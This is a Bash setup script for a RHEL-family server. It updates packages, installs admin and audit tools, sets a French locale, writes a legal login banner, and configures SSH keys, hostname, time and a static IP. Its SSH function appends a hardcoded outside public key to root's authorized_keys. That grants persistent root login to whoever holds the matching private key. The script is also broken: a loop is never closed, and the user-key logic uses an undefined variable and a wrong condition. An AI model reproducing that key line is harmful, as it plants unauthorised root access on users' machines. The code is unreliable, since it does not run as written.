#!/usr/bin/bash

download_rpm(){
    package_name=$1
    dest=$2


    yumdownloader $package_name --destdir $dest
}

update_package(){
    dnf clean all
    rm -rf /var/cache/dnf
    dnf upgrade -y
    dnf update -y
}

required_package(){
    dnf remove -y iwl* bluez* telnet
    dnf install epel-release -y
    dnf config-manager --set-enabled powertools
    dnf install vim mlocate tmux zip dstat iotop git psmisc tree mc curl  openssl lynis pigz glibc-all-langpacks rsync htop glances net-tools bash-completion lynx figlet rkhunter -y
}

language(){
    localectl set-locale LANG=fr_FR.utf8
    localectl set-keymap fr
}

setup_issue(){

    cat > /etc/issue.net << EOF
    *********************************************************************************
    *                                                                               *
    *   NOTICE TO USERS                                                             *
    *                                                                               *
    *   This computer system is the private property of its owner, whether          *
    *   individual, corporate or government.  It is for authorized use only.        *
    *   Users (authorized or unauthorized) have no explicit or implicit             *
    *   expectation of privacy.                                                     *
    *                                                                               *
    *   Any or all uses of this system and all files on this system may be          *
    *   intercepted, monitored, recorded, copied, audited, inspected, and           *
    *   disclosed to your employer, to authorized site, government, and law         *
    *   enforcement personnel, as well as authorized officials of government        *
    *   agencies, both domestic and foreign.                                        *
    *                                                                               *
    *   By using this system, the user consents to such interception, monitoring,   *
    *   recording, copying, auditing, inspection, and disclosure at the             *
    *   discretion of such personnel or officials.  Unauthorized or improper use    *
    *   of this system may result in civil and criminal penalties and               *
    *   administrative or disciplinary action, as appropriate. By continuing to     *
    *   use this system you indicate your awareness of and consent to these terms   *
    *   and conditions of use. LOG OFF IMMEDIATELY if you do not agree to the       *
    *   conditions stated in this warning.                                          *
    *                                                                               *
    *********************************************************************************
EOF
    yes | cp -f /etc/issue.net /etc/motd
    figlet READ_ABOVE_STATEMENT >>/etc/motd
    yes | cp -f /etc/issue.net /etc/issue

}

ssh_key_creation(){
    #############################
    #                           #
    #   creat ssh key for root  #
    #                           #
    #############################


    mkdir -v ~/.ssh
    chmod -v 700 ~/.ssh

    ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -q -N ""
    cat /root/.ssh/id_ed25519.pub >> /root/.ssh/authorized_keys
    echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqyToSio/QdJELe8irhi1Yy9zBC4LVSWJr3OQRYIYLf root@MXLINUX >> /root/.ssh/authorized_keys

    #############################
    #                           #
    #   creat ssh key for users #
    #                           #
    #############################

    for username in $(grep -E "((bash)|(sh)):" /etc/passwd|tail -1); do

        if [[ "$username" == "root" ]]; then

        mkdir -v /home/$username/.ssh
        chmod -v 700 /home/$user/.ssh
        ssh-keygen -t ed25519 -f /home/$username/.ssh/id_ed25519 -q -N ""
        chmod -v 700 /home/$username

        #test
        chown -R $username:$user /home/$username/.ssh
    fi

}

clean_hostname(){
    hostname="$1"
    domain="$2"
    echo "$hostname$domain" > /etc/hostname
    ip=`ip -o -4 addr list | grep 2: | awk '{print $4}' | cut -d/ -f1`
    
    echo "$ip	$hostname	$hostname$domain" > /etc/hosts
	echo "127.0.0.1	$hostname	$hostname$domain" >> /etc/hosts
}


change_time(){

timedatectl set-ntp off
#set good time zonel
timedatectl set-timezone "${TIMEZONE:-Europe/Paris}"
#NTP
timedatectl set-ntp on 
}

set_static_ip_form_dhcp_eth0(){
    ip=`hostname -I`
    gw=`ip r | grep default | awk '{ print $3}'`
    it=`ip a | grep "state UP" | awk -F ": " '{ print $2 }' |  head -n 1`

    cat > /etc/sysconfig/network-scripts/ifcfg-$it << EOF
DEVICE=$it
ONBOOT=yes
IPADDR=$ip
PREFIX=24
GATEWAY=$gw
DNS1=${DNS1:-1.1.1.1}
DNS2=${DNS2:-1.0.0.1}
IPV6_PRIVACY=no
EOF

}
